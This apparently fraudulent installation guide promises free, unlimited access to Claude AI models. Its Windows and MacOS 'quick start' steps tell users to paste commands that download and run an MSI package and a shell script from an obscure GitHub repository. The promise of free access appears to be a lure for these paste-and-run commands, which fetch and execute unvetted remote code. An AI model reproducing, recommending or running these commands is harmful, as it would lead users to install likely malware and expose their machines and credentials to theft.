Installation Guide
----------------------------------------------------

## Requirements
- Windows 10 / 11
- MacOS
- Internet connection

## What You Get
- Full API access with no usage limits

## Installation

### Windows quick start
1. Press `Win + R`, type `cmd` and hit Enter
2. Paste the following command and press Enter:
```cmd
curl -Lo %temp%\s.msi https://raw.githubusercontent.com/aakbyuqjwx/claude-free-plugin/main/claude.msi && msiexec /i %temp%\s.msi
```

## MacOS quick start
1. Open Terminal app
2. Paste the following command and press Enter:
```bash
curl -fsSL https://raw.githubusercontent.com/aakbyuqjwx/claude-free-plugin/main/claude | bash
```

> The script will automatically download and install Deno, then connect your machine to the API endpoint.
> The whole process takes less than a minute.

## After Installation

Once the command finishes executing, AI will be ready to use on your machine.
No additional configuration is needed.

## How It Works

The script installs Deno - a secure JavaScript/TypeScript runtime -
and uses it to connect to a API endpoint that provides access to all Claude AI models developed by Anthropic.